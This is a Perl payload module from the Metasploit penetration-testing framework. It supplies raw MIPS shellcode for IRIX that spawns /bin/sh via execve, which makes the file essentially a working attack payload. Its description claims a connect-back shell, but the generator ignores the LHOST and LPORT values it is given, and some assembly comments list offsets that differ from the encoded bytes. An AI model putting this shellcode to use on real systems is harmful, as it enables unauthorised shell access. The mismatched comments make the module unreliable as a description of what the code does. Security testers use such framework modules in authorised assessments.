
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Payload::irix_execve;
use strict;
use base 'Msf::PayloadComponent::FindConnection';

my $info =
{
  'Name'         => 'irix_execve',
  'Version'      => '$Revision$',
  'Description'  => 'Connect back to attacker and spawn a shell',
  'Authors'      => [ 'LSD [Unknown License]', ],
  'Arch'         => [ 'mips' ],
  'Priv'         => 0,
  'OS'           => [ 'irix' ],
  'Size'         => '',
  'Keys'         => ['inetd'], # can use execve for inetd-based exploits
};

sub new {
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHash($hash, {'Info' => $info});
  my $self = $class->SUPER::new($hash, @_);

  $self->_Info->{'Size'} = $self->_GenSize;
  return($self);
}

sub Build {
  my $self = shift;
  return($self->Generate($self->GetVar('LHOST'), $self->GetVar('LPORT')));
}

sub Generate {
  my $self = shift;

  my $shellcode =
    "\x04\x10\xff\xff".    # /* bltzal  $zero,<shellcode>      */
    "\x24\x02\x03\xf3".    # /* li      $v0,1011               */
    "\x23\xff\x01\x14".    # /* addi    $ra,$ra,276            */
    "\x23\xe4\xff\x08".    # /* addi    $a0,$ra,-248           */
    "\x23\xe5\xff\x10".    # /* addi    $a1,$ra,-220           */
    "\xaf\xe4\xff\x10".    # /* sw      $a0,-220($ra)          */
    "\xaf\xe0\xff\x14".    # /* sw      $zero,-236($ra)        */
    "\xa3\xe0\xff\x0f".    # /* sb      $zero,-241($ra)        */
    "\x03\xff\xff\xcc".    # /* syscall                        */
    "/bin/sh";

  return($shellcode);
}

sub _GenSize {
  my $self = shift;
  my $bin = $self->Generate();
  return(length($bin));
}

1;
